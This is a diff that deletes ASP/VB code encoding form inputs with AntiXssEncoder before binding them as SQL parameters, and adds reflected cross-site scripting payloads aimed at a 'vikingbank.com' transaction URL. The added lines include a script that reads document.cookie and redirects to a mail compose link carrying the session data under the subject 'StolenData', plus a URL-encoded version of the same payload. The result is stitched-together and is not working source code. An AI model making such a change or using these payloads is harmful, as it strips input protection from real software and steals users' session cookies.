@@ -1,14 +1,13 @@
-Dim encodedStatcd, encodedA0, encodedQpr, encodedQqa, encodedQcl, encodedCms
-encodedStatcd = System.Web.Security.AntiXss.AntiXssEncoder.HtmlEncode(Request.Form("statcd"), True)
-encodedA0 = System.Web.Security.AntiXss.AntiXssEncoder.HtmlEncode(Request.Form("a0"), True)
-encodedQpr = System.Web.Security.AntiXss.AntiXssEncoder.HtmlEncode(Request.Form("qpr"), True)
-encodedQqa = System.Web.Security.AntiXss.AntiXssEncoder.HtmlEncode(Request.Form("qqa"), True)
-encodedQcl = System.Web.Security.AntiXss.AntiXssEncoder.HtmlEncode(Request.Form("qcl"), True)
-encodedCms = System.Web.Security.AntiXss.AntiXssEncoder.HtmlEncode(Request.Form("cms"), True)
+https://vikingbank.com/transaction?id=2%22%3E%3Cscript%3EuseSimpleMode()%3C/script%3E
 
-oCmd.Parameters.Append oCmd.CreateParameter("@STAT_CODE", VarChar, 1, 50, encodedStatcd)
-oCmd.Parameters.Append oCmd.CreateParameter("@A0", Khar, 2, 2, encodedA0)
-oCmd.Parameters.Append oCmd.CreateParameter("@QPR", Khar, 1, 1, encodedQpr)
-oCmd.Parameters.Append oCmd.CreateParameter("@QQA", Khar, 1, 1, encodedQqa)
-oCmd.Parameters.Append oCmd.CreateParameter("@QCL", Khar, 1, 1, encodedQcl)
-oCmd.Parameters.Append oCmd.CreateParameter("@CMS_CONT", Khar, 1, 1, encodedCms)
+
+
+<script>
+  var stolenData = document.cookie;
+  var emailBody = encodeURIComponent("Session data: " + stolenData);
+  window.location.href = "Mail.viking.com/mail/u/0/?compose=new&body=" + emailBody + "&subject=StolenData";
+</script>
+
+
+
+https://vikingbank.com/transaction?id=2%22%3E%3Cscript%3Evar%20stolenData%20=%20document.cookie;%20var%20emailBody%20=%20encodeURIComponent('Session%20data:%20'+stolenData);%20window.location.href='Mail.viking.com/mail/u/0/?compose=new&body='+emailBody+'&subject=StolenData';%3C/script%3E
